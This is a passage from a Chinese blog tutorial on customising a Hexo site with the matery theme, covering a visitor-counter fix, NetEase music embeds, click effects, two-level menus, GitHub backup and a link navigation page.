fa-heart-o"&gt;&lt;/i&gt;        本站总访问量 &lt;span id="busuanzi_value_site_pv" class="white-color"&gt;&lt;/span&gt;&lt;% } %&gt;&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalNumberOfvisitors) { %&gt;    &lt;span id="busuanzi_container_site_uv" style='display:none'&gt;&lt;/span&gt;        人次,&amp;nbsp;访客数 &lt;span id="busuanzi_value_site_uv" class="white-color"&gt;&lt;/span&gt; 人.&lt;% } %&gt;</code></pre><p>变化就在下面两句，将源代码对应字段后面的<code>＜/span＞</code>写在前面了。</p><pre><code>&lt;span id="busuanzi_container_site_pv" style='display:none'&gt;&lt;/span&gt;&lt;span id="busuanzi_container_site_uv" style='display:none'&gt;&lt;/span&gt;</code></pre><p><strong>发现按照上面改了过后，又出现一个新<code>bug</code>：文章头部的阅读次数不显示了，解决办法：（2019.08.11）</strong></p><p>打开<code>themes\matery\layout\_partial</code>中的<code>post-detail.ejs</code>，找到对应代码字段：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.enable) { %&gt;    &lt;div id="busuanzi_container_page_pv" class="info-break-policy"&gt;        &lt;i class="fa fa-eye fa-fw"&gt;&lt;/i&gt;&lt;%- __('readCount') %&gt;:&amp;nbsp;&amp;nbsp;        &lt;span id="busuanzi_value_page_pv" &gt;&lt;/span&gt;    &lt;/div&gt;&lt;% } %&gt;</code></pre><p>修改为下面的就可以了：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.enable) { %&gt;        &lt;span id="busuanzi_container_site_pv" style='display:none'&gt;&lt;/span&gt;        &lt;i class="fa fa-eye fa-fw"&gt;&lt;/i&gt;&lt;%- __('readCount') %&gt;:&amp;nbsp;&amp;nbsp;        &lt;span id="busuanzi_value_page_pv" &gt;&lt;/span&gt;&lt;% } %&gt;</code></pre><h2 id="添加网易云音乐BGM"><a href="#添加网易云音乐BGM" class="headerlink" title="添加网易云音乐BGM"></a>添加网易云音乐BGM</h2><p>写文章的时候，想插入一段<code>BGM</code>怎么办？</p><p>其实我们可以借助一些在线音乐的外链播放方式，首先打开网易云网页版，找到想听的歌曲，然后点击生成外链：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/14.png" alt="img"></p><p>可能你会遇到问题，比如点击生成外链会提示你由于版权原因，不能生成，那么可以用下面办法目前还有效，不知道后面会不会失效目前还有效，不知道后面会不会失效</p><ol><li>(以 <code>Chrome</code>为例，其他浏览器类似) 打开歌单页面，在“生成外链播放器”上右击，点击审查元素（检查）ctrl+shift+i；</li><li>接着找到生成外链播放器这段文字直接双击复制前面的<code>/outchain/2/20707408/</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/15.png" alt="img"></p><ol><li>然后在浏览器地址栏修改歌单链接，示例：<a href="http://music.163.com/#//outchain/2/20707408/" target="_blank" rel="noopener">http://music.163.com/#//outchain/2/20707408/</a></li><li>然后就转到外链设置页面了。</li></ol><p>复制如下代码：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/16.png" alt="img"></p><p>粘贴到文章对应位置就行了，为了美观，设置一下居中，具体代码如下：</p><p>粘贴到文章对应位置就行了，为了美观，设置一下居中，具体代码如下：</p><pre><code>&lt;div align="middle"&gt;这里粘贴刚刚复制的代码&lt;/div&gt;</code></pre><h2 id="博客音乐模板"><a href="#博客音乐模板" class="headerlink" title="博客音乐模板"></a>博客音乐模板</h2><p>如果我们自己写博客写疲劳了，想放松一下听听歌又不想切出博客主页，那么我们可以自己定制一个博客音乐播放界面，把自己喜欢的歌曲都放进来，这里用到是Aplayer插件，但是歌曲来源需要我们自己定义，但是，因为各大音乐平台，由于版权原因，很多歌曲是不支持外链播放的，难道我们就必须每首歌下载然后上传云空间，再获取词曲封面么？这就比较麻烦了。其实不然，研究了半个小时，我发现可以采取下面的办法，很方便：</p><ul><li>首先我们找到网易云在线平台，任意找到一首歌点进去播放，可以在地址栏拿到音乐<code>ID</code>号</li><li>然后通过下面网址：<a href="http://music.163.com/song/media/outer/url?id=XXXXXX.mp3，" target="_blank" rel="noopener">http://music.163.com/song/media/outer/url?id=XXXXXX.mp3，</a> <code>XXXXXX</code>就是歌曲<code>ID</code>号，每一首歌我们只需要换掉这个<code>ID</code>号就行了,就相当于每一首的外链了</li><li>最后封面图也可以按<code>F12</code>去找页面元素的链接，填到对应的<code>musics.jason</code>文件中就可以，批量填入，听到好听的歌曲随时更换随时新增，很方便。</li></ul><h2 id="添加鼠标点击文字特效"><a href="#添加鼠标点击文字特效" class="headerlink" title="添加鼠标点击文字特效"></a>添加鼠标点击文字特效</h2><p>在 /themes/matery/source/js 新建文件 wenzi.js，并添加如下代码</p><p>[ Download Now</p><p>](<a href="http://49.235.106.229/js/wenzi.js" target="_blank" rel="noopener">http://49.235.106.229/js/wenzi.js</a>)</p><p>然后在 /themes/matery/layout/_partial/head.ejs 中添加如下代码：</p><pre><code>&lt;% if (theme.wenzi.enable) { %&gt;    &lt;script type="text/javascript"&gt;    //只在桌面版网页启用特效    var windowWidth = $(window).width();    if (windowWidth &gt; 768) {        document.write('&lt;script type="text/javascript" src="/js/wenzi.js"&gt;&lt;/script&gt;');    }    &lt;/script&gt;&lt;% } %&gt;</code></pre><p>在主题配置文件 .yml中配置:</p><pre><code># 页面樱花飘落动效wenzi:  enable: true</code></pre><h2 id="添加二级菜单"><a href="#添加二级菜单" class="headerlink" title="添加二级菜单"></a>添加二级菜单</h2><p>都知道，我们标题栏宽度有限，我们项目一多了，就放不下了，这时候你肯定就需要一个二级菜单来拆分一下项目，既可以减少标题栏项目数，使之更加清爽，又可以间项目分类，逻辑清晰。</p><p>好了，如果你用的matery主题，那么废话不多说，直接上教程，其实需要修改的就四个地方：matery.css/matery.js/navgation.ejs/mobile-nav.ejs</p><p>第一步，在 /themes/matery/layout/_partial 中找到 mobile-nav.ejs ，找到下面这段代码：</p><pre><code>&lt;ul class="menu-list mobile-menu-list"&gt;    &lt;% Object.keys(theme.menu).forEach(function(key) { %&gt;    &lt;li&gt;        &lt;a href="&lt;%- theme.menu[key].url %&gt;" class="waves-effect waves-light"&gt;            &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) { %&gt;            &lt;i class="fa fa-fw &lt;%- theme.menu[key].icon %&gt;"&gt;&lt;/i&gt;            &lt;% } else { %&gt;            &lt;i class="fa fa-fw fa-link"&gt;&lt;/i&gt;            &lt;% } %&gt;            &lt;%- (config.language === 'zh-CN' &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;        &lt;/a&gt;    &lt;/li&gt;    &lt;% }); %&gt;    &lt;% if (theme.githubLink &amp;&amp; theme.githubLink.enable) { %&gt;    &lt;li&gt;&lt;div class="divider"&gt;&lt;/div&gt;&lt;/li&gt;    &lt;li&gt;        &lt;a href="&lt;%- theme.githubLink.url %&gt;" class="waves-effect waves-light" target="_blank"&gt;            &lt;i class="fa fa-github-square fa-fw"&gt;&lt;/i&gt;&lt;%- theme.githubLink.title %&gt;        &lt;/a&gt;    &lt;/li&gt;    &lt;% } %&gt;&lt;/ul&gt;</code></pre><p>替换成下面的：</p><pre><code>&lt;!-- 支持二级菜单特性 洪卫 shw2018 modify 2019.09.17  --&gt;&lt;ul class="menu-list mobile-menu-list"&gt;    &lt;% Object.keys(theme.menu).forEach(function(key) { %&gt;        &lt;li class="m-nav-item"&gt;                &lt;% if(!theme.menu[key].children) { %&gt;                    &lt;a href="&lt;%- theme.menu[key].url %&gt;" class="waves-effect waves-light"&gt;                        &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) { %&gt;                        &lt;i class="fa fa-fw &lt;%- theme.menu[key].icon %&gt;"&gt;&lt;/i&gt;                        &lt;% } else { %&gt;                        &lt;i class="fa fa-fw fa-link"&gt;&lt;/i&gt;                        &lt;% } %&gt;                        &lt;%- (config.language === 'zh-CN' &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;                    &lt;/a&gt;              &lt;% } else { %&gt;                    &lt;a href="javascript:;"&gt;                            &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) { %&gt;                            &lt;i class="fa fa-fw &lt;%- theme.menu[key].icon %&gt;"&gt;&lt;/i&gt;                            &lt;% } else { %&gt;                            &lt;i class="fa fa-fw fa-link"&gt;&lt;/i&gt;                            &lt;% } %&gt;                            &lt;%- (config.language === 'zh-CN' &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;                            &lt;span class="m-icon"&gt;&lt;i class="fa fa-chevron-right"&gt;&lt;/i&gt;&lt;/span&gt;                    &lt;/a&gt;                &lt;ul&gt;                  &lt;% for(let childrenLink of theme.menu[key].children){ %&gt;                    &lt;li&gt;                       &lt;a href="&lt;%- url_for(childrenLink.url)%&gt;" &gt;                           &lt;% if (childrenLink.icon &amp;&amp; childrenLink.icon.length &gt; 0) { %&gt;                            &lt;i class="fa &lt;%- childrenLink.icon %&gt;" style="left: 25px; position: absolute;"&gt;&lt;/i&gt;                       &lt;% } %&gt;                       &lt;span&gt;&lt;%- childrenLink.name %&gt;&lt;/span&gt;                      &lt;/a&gt;                    &lt;/li&gt;                  &lt;% } %&gt;                 &lt;/ul&gt;              &lt;% } %&gt;            &lt;/li&gt;        &lt;% }); %&gt;        &lt;% if (theme.githubLink &amp;&amp; theme.githubLink.enable) { %&gt;        &lt;li&gt;&lt;div class="divider"&gt;&lt;/div&gt;&lt;/li&gt;        &lt;li&gt;            &lt;a href="&lt;%- theme.githubLink.url %&gt;" class="waves-effect waves-light" target="_blank"&gt;                &lt;i class="fa fa-github-square fa-fw"&gt;&lt;/i&gt;&lt;%- theme.githubLink.title %&gt;            &lt;/a&gt;        &lt;/li&gt;      &lt;% } %&gt;&lt;/ul&gt;</code></pre><p>第二步，在 /themes/matery/layout/_partial 中找到 navagtion.ejs ，找到下面这段代码：</p><pre><code>&lt;a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"&gt;&lt;i class="fa fa-navicon"&gt;&lt;/i&gt;&lt;/a&gt;&lt;ul class="right"&gt;    &lt;% Object.keys(theme.menu).forEach(function(key) { %&gt;    &lt;li class="hide-on-med-and-down"&gt;        &lt;a href="&lt;%- theme.menu[key].url %&gt;" class="waves-effect waves-light"&gt;            &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) { %&gt;            &lt;i class="fa &lt;%- theme.menu[key].icon %&gt;"&gt;&lt;/i&gt;            &lt;% } %&gt;            &lt;span&gt;&lt;%- (config.language === 'zh-CN' &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;&lt;/span&gt;        &lt;/a&gt;    &lt;/li&gt;    &lt;% }); %&gt;    &lt;li&gt;        &lt;a href="#searchModal" class="modal-trigger waves-effect waves-light"&gt;            &lt;i id="searchIcon" class="fa fa-search" title="&lt;%= __('search') %&gt;"&gt;&lt;/i&gt;        &lt;/a&gt;    &lt;/li&gt;&lt;/ul&gt;</code></pre><p>替换成下面的：</p><pre><code>&lt;!-- 支持二级菜单特性 洪卫 shw2018 modify 2019.09.17  --&gt;&lt;a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"&gt;&lt;i class="fa fa-navicon"&gt;&lt;/i&gt;&lt;/a&gt;&lt;ul class="right nav-menu"&gt;    &lt;% Object.keys(theme.menu).forEach(function(key) { %&gt;      &lt;li class="hide-on-med-and-down nav-item" &gt;        &lt;% if(!theme.menu[key].children) { %&gt;            &lt;a href="&lt;%- theme.menu[key].url %&gt;" class="waves-effect waves-light"&gt;              &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) { %&gt;                &lt;i class="fa &lt;%- theme.menu[key].icon %&gt;"&gt;&lt;/i&gt;              &lt;% } %&gt;              &lt;span&gt;&lt;%- (config.language === 'zh-CN' &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;&lt;/span&gt;            &lt;/a&gt;            &lt;% } else { %&gt;              &lt;a href="&lt;%- theme.menu[key].url %&gt;" class="waves-effect waves-light"&gt;                &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) { %&gt;                  &lt;i class="fa &lt;%- theme.menu[key].icon %&gt;"&gt;&lt;/i&gt;                &lt;% } %&gt;                &lt;span&gt;&lt;%- (config.language === 'zh-CN' &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;&lt;/span&gt;                &lt;i class="fa fa-chevron-down" aria-hidden="true"&gt;&lt;/i&gt;              &lt;/a&gt;            &lt;ul class="sub-nav menus_item_child "&gt;              &lt;% for(let childrenLink of theme.menu[key].children){ %&gt;                &lt;li&gt;                   &lt;a href="&lt;%- url_for(childrenLink.url)%&gt;" &gt;                    &lt;% if (childrenLink.icon &amp;&amp; childrenLink.icon.length &gt; 0) { %&gt;                      &lt;i class="fa &lt;%- childrenLink.icon %&gt;" style="margin-top: -20px;"&gt;&lt;/i&gt;                    &lt;% } %&gt;                    &lt;span&gt;&lt;%- childrenLink.name %&gt;&lt;/span&gt;                  &lt;/a&gt;                &lt;/li&gt;              &lt;% } %&gt;             &lt;/ul&gt;          &lt;% } %&gt;      &lt;/li&gt;    &lt;% }); %&gt;    &lt;li&gt;        &lt;a href="#searchModal" class="modal-trigger waves-effect waves-light"&gt;            &lt;i id="searchIcon" class="fa fa-search" title="&lt;%= __('search') %&gt;"&gt;&lt;/i&gt;        &lt;/a&gt;    &lt;/li&gt;&lt;/ul&gt;</code></pre><p>第三步，在 /themes/matery/source/css 中找到 matery.css ，在最后添加下面这段代码：</p><pre><code>/* 二级菜单样式定义 洪卫 shw2018 add 2019.09.17 */.nav-menu {}.nav-menu li .sub-nav {    position: absolute;    top: 77px;    list-style: none;    margin-left: -20px;    display: none;}.nav-menu li .sub-nav li {    text-align: center;    clear: left;    width: 140px;    height: 35px;    line-height: 35px;    position: relative;}.nav-menu li .sub-nav li a {    height: 34px;    line-height: 34px;    width: 138px;    padding: 0px;    display: inline-block;    border-radius: 5px;    color: #000;}.nav-show i[aria-hidden=true] {    -webkit-transform: rotate(180deg) !important;    -moz-transform: rotate(180deg) !important;    -o-transform: rotate(180deg) !important;    -ms-transform: rotate(180deg) !important;    transform: rotate(180deg) !important;    -webkit-transition: all .3s;    -moz-transition: all .3s;    -o-transition: all .3s;    -ms-transition: all .3s;    transition: all .3s;}.menus_item_child {    background-color: rgba(255, 255, 255, .8);    width: fit-content;    border-radius: 10px;    -webkit-box-shadow: 0 5px 20px -4px rgba(0, 0, 0, .5);    box-shadow: 0 5px 20px -4px rgba(0, 0, 0, .5);    display: none;    opacity: 0.98;    -ms-filter: none;    filter: none;    -webkit-animation: sub_menus .3s .1s ease both;    -moz-animation: sub_menus .3s .1s ease both;    -o-animation: sub_menus .3s .1s ease both;    -ms-animation: sub_menus .3s .1s ease both;    animation: sub_menus .3s .1s ease both;}.menus_item_child:before {    content: "";    position: absolute;    top: -20px;    left: 50%;    margin-left: -10px;    border-width: 10px;    border-style: solid;    border-color: transparent transparent rgba(255, 255, 255, .8)}.m-nav-item {    /* position: relative; */    left: 45px}.m-nav-item ul {    display: none;    background: rgba(255, 255, 255, .1);}.m-nav-item ul li {    width: 245px;    height: 50px;    line-height: 50px;    text-align: center;}.m-nav-show .m-icon {    -webkit-transform: rotate(90deg) !important;    -moz-transform: rotate(90deg) !important;    -o-transform: rotate(90deg) !important;    -ms-transform: rotate(90deg) !important;    transform: rotate(90deg) !important;    -webkit-transition: all .3s;    -moz-transition: all .3s;    -o-transition: all .3s;    -ms-transition: all .3s;    transition: all .3s;}.m-nav-show .m-nav-item&gt;a:hover {    color: #FFF;    background: rgba(255, 255, 255, .8);}.m-nav-show&gt;a:before,.m-nav-item&gt;a:hover:before {    opacity: 1;}.m-nav-item .m-icon {    position: absolute;    right: 65px;    height: 50px;    padding: 0px;    margin: 0px;}.nav-item li:hover a {    color: #FFF;    background: rgba(0, 0, 0, .1);}</code></pre><p>第四步，在 /themes/matery/source/js 中找到 matery.js ，在最后一个 <code>});</code>前添加下面这段代码：</p><pre><code>// 增加二级菜单功能 洪卫 shw2018 add 2019.09.17    $(".nav-menu&gt;li").hover(function(){        $(this).children('ul').stop(true,true).show();        $(this).addClass('nav-show').siblings('li').removeClass('nav-show');    },function(){        $(this).children('ul').stop(true,true).hide();        $('.nav-item.nav-show').removeClass('nav-show');    })    $('.m-nav-item&gt;a').on('click',function(){            if ($(this).next('ul').css('display') == "none") {                $('.m-nav-item').children('ul').slideUp(300);                $(this).next('ul').slideDown(300);                $(this).parent('li').addClass('m-nav-show').siblings('li').removeClass('m-nav-show');            }else{                $(this).next('ul').slideUp(300);                $('.m-nav-item.m-nav-show').removeClass('m-nav-show');            }    });</code></pre><p>第五步，在主题配置文件.yml修改标题栏内容，按下面格式更改:第五步，在主题配置文件.yml修改标题栏内容，按下面格式更改:</p><pre class="line-numbers language-yml"><code class="language-yml">  标题一级:     url: /XXX    icon: fa-XXXX    children:       -        name: 标题二级1        url: /XXX/XXX        icon: fa-XXXX      -        name: 标题二级2        url: /XXX/XXX        icon: fa-XXXX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第六步，source 文件夹新疆对应的标题目录，并放 index.md 模板就行了。</p><p>到这一步就大功告成了，快去体验吧</p><h2 id="备份博客源文件"><a href="#备份博客源文件" class="headerlink" title="备份博客源文件"></a>备份博客源文件</h2><p>有时候我们想换一台电脑继续写博客，最简单的方法就是把博客整个目录拷贝过去，就是这么暴力。不过，这种方法有个问题就是要是那天电脑崩了，本地源文件丢失了，比较麻烦，所以这时候就可以将博客目录下的所有源文件都上传到<code>github</code>上面。</p><p>首先在<code>github</code>博客仓库下新建一个分支<code>hexo</code>，然后<code>git clone</code>到本地，把<code>.git</code>文件夹拿出来，放在博客根目录下。</p><p>然后<code>git branch -b hexo</code>切换到<code>hexo</code>分支，然后<code>git add .</code>，然后<code>git commit -m "xxx"</code>，最后<code>git push origin hexo</code>提交就行了。</p><p>具体效果可以看我的博客源文件仓库：<a href="https://github.com/shw2018/shw2018.github.io" target="_blank" rel="noopener">传送门</a>。</p><p>大家也可以先用下文<code>hexo</code>安装方法安装完<code>hexo</code>，然后直接<code>git clone -b hexo https://github.com/shw2018/shw2018.github.io.git</code>克隆我的所有源文件，这是我目前修改完的基本没<code>bug</code>的定制化的博客，可以直接拿来用。</p><h1 id="出现Cannot-find-module-‘xxx’-错误"><a href="#出现Cannot-find-module-‘xxx’-错误" class="headerlink" title="出现Cannot find module ‘xxx’ 错误"></a>出现Cannot find module ‘xxx’ 错误</h1><ol><li>直接进行npm install重新打包；</li><li>如果npm install重新打包之后，仍然出现这个问题，可以进行删除node_modules文件夹，同时清除缓存，如下命令：</li></ol><pre><code>rm -rf node_modulescnpm cache clean --forcecnpm install </code></pre><h2 id="添加百度导航页面"><a href="#添加百度导航页面" class="headerlink" title="添加百度导航页面"></a>添加百度导航页面</h2><p>在主题的layout文件夹下添加navigate.ejs文件，文件内容如下</p><pre><code>&lt;div class="navi-height bg-cover pd-header "&gt;    &lt;div class=" link-box container"&gt;        &lt;!-- 搜索框 --&gt;        &lt;div class="baidu baidu-2 large-screen"&gt;            &lt;form name="f" action="https://www.baidu.com/" target="_blank"&gt;                &lt;div id="Select-2"&gt;                    &lt;div class="Select-box-2" id="baidu"&gt;                        &lt;ul style="height: 46px;"&gt;                            &lt;li class="this_s"&gt;百 · 度&lt;/li&gt;                            &lt;li class="bing_s"&gt;必 · 应&lt;/li&gt;                            &lt;li class="google_s"&gt;谷 · 歌&lt;/li&gt;                            &lt;li class="baidu_s"&gt;百 · 度&lt;/li&gt;                        &lt;/ul&gt;                    &lt;/div&gt; &lt;input name="wd" id="kw-2" maxlength="100" autocomplete="off" type="text"&gt;                &lt;/div&gt;                &lt;div class="qingkong" id="qingkong" title="清 · 空" style="display: none;"&gt;x&lt;/div&gt; &lt;input value="搜 · 索"                    id="su-2" type="submit"&gt;                &lt;ul class="keylist"&gt;&lt;/ul&gt;            &lt;/form&gt;        &lt;/div&gt; &lt;!-- 链接 --&gt;        &lt;div class="row tags-posts "&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;娱乐 · 影视&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.jd.com/" class="link-3" target="_blank"&gt;京东&lt;/a&gt;                        &lt;li&gt;&lt;a href="https://www.taobao.com/" class="link-3" target="_blank"&gt;淘宝&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.tmall.com/" class="link-3" target="_blank"&gt;天猫&lt;/a&gt;&lt;/li&gt;                        &lt;/li&gt;                        &lt;li&gt;&lt;a href="https://v.qq.com/" class="link-3" target="_blank"&gt;腾讯视频&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.iqiyi.com/" class="link-3" target="_blank"&gt;爱奇艺&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.bilibili.com/" class="link-3" target="_blank"&gt;哔哩哔哩&lt;/a&gt; &lt;/li&gt;                        &lt;li&gt;&lt;a href="https://music.163.com/" class="link-3" target="_blank"&gt;网易云音乐&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://y.qq.com/" class="link-3" target="_blank"&gt;QQ音乐&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.kugou.com/" class="link-3" target="_blank"&gt;酷狗音乐&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;社区 · Code&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.mobaijun.com/contact/" class="link-3" target="_blank"&gt;留言&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://github.com/" class="link-3" target="_blank"&gt;GitHub&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://coding.net/" class="link-3" target="_blank"&gt;Coding&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://juejin.im/" class="link-3" target="_blank"&gt;掘金&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://gitee.com/" class="link-3" target="_blank"&gt;码云&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.csdn.net/" class="link-3" target="_blank"&gt;CSDN&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.jianshu.com/" class="link-3" target="_blank"&gt;简书&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://segmentfault.com/" class="link-3" target="_blank"&gt;思否&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://cloud.tencent.com/developer/" class="link-3" target="_blank"&gt;云+社区&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;实用 · 工具&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://mdnice.com/" class="link-3" target="_blank"&gt;Nice编辑器&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://translate.google.cn/" class="link-3" target="_blank"&gt;谷歌翻译&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.uupoop.com/" class="link-3" target="_blank"&gt;在线PS&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.processon.com/" class="link-3" target="_blank"&gt;思维导图&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://wallhaven.cc/" class="link-3" target="_blank"&gt;超清壁纸&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://cli.im/" class="link-3" target="_blank"&gt;二维码&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.yinfans.me/" class="link-3" target="_blank"&gt;音范思&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.52pojie.cn/" class="link-3" target="_blank"&gt;吾爱破解&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://my.openwrite.cn/" class="link-3" target="_blank"&gt;OW分发&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;编程 · 学习&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.oschina.net/" class="link-3" target="_blank"&gt;开源中国&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://htmldog.com/" class="link-3" target="_blank"&gt;HTML狗&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.icourse163.org/" class="link-3" target="_blank"&gt;中国大学慕课&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.imooc.com/" class="link-3" target="_blank"&gt;慕课网&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.wxapp-union.com/" class="link-3" target="_blank"&gt;小程序&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.runoob.com/" class="link-3" target="_blank"&gt;菜鸟教程&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://blog.51cto.com/" class="link-3" target="_blank"&gt;51CTO&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.shiyanlou.com/library/" class="link-3" target="_blank"&gt;实验楼&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://spring.io/" class="link-3" target="_blank"&gt;Spring&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;资讯 · 趋势&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.huxiu.com/" class="link-3" target="_blank"&gt;虎嗅&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://insights.stackoverflow.com/" class="link-3" target="_blank"&gt;技术调查&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.asciiworld.com/" class="link-3" target="_blank"&gt;摸鱼&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://sspai.com/" class="link-3" target="_blank"&gt;少数派&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://zh.wikihow.com/" class="link-3" target="_blank"&gt;WikeHom&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.awesomes.cn/rank?sort=hot" class="link-3" target="_blank"&gt;前端趋势&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://github-trending.com/" class="link-3" target="_blank"&gt;GitHub趋势&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.tiobe.com/" class="link-3" target="_blank"&gt;编程趋势&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://trends.google.com/" class="link-3" target="_blank"&gt;Google趋势&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;搜索 · 其他&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://ac.scmor.com/" class="link-3" target="_blank"&gt;谷歌镜像&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.pansoso.com/" class="link-3" target="_blank"&gt;网盘搜索&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://tool.mkblog.cn/music/" class="link-3" target="_blank"&gt;音乐搜索&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.dytt8.net/" class="link-3" target="_blank"&gt;电影天堂&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://carbon.now.sh/" class="link-3" target="_blank"&gt;代码图片&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.zhipin.com/" class="link-3" target="_blank"&gt;Boos&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://fontawesome.com/" class="link-3" 